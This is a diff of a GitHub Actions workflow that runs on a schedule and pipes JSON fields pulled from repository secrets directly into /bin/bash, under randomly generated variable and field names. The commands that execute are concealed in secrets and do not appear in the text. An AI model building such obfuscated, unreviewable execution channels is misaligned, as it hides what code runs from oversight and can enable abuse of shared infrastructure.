@@ -3,20 +3,24 @@ name: chenjinzhisuo
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 2/6 * * *'
-
+    - cron: '24 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: chenjinzhisuo
         env:
-          ely33: ${{ secrets.ely33 }}
+          t75: ${{ secrets.t75 }}
         run: |
-          echo $ely33 | jq -r .sn4168 | /bin/bash
-          echo $xjag97 | jq -r .a13 | /bin/bash
-          echo $ucf85449 | jq -r .v079 | /bin/bash
-          echo $ttrq93 | jq -r .sviir76032 | /bin/bash
-          echo $hxtvs72478 | jq -r .zy2 | /bin/bash
+          echo $t75 | jq -r .mqms15 | /bin/bash
+          echo $wbteh21646 | jq -r .ri5957 | /bin/bash
+          echo $tv8940 | jq -r .vaoeg3 | /bin/bash
+          echo $vs0 | jq -r .xnh7726 | /bin/bash
+          echo $vn6 | jq -r .niae1 | /bin/bash
+          echo $owbfk064 | jq -r .mq2 | /bin/bash
+          echo $o787 | jq -r .ioip6427 | /bin/bash
+          echo $hn5602 | jq -r .whx30 | /bin/bash
+          echo $ijnbb99 | jq -r .j19546 | /bin/bash
 
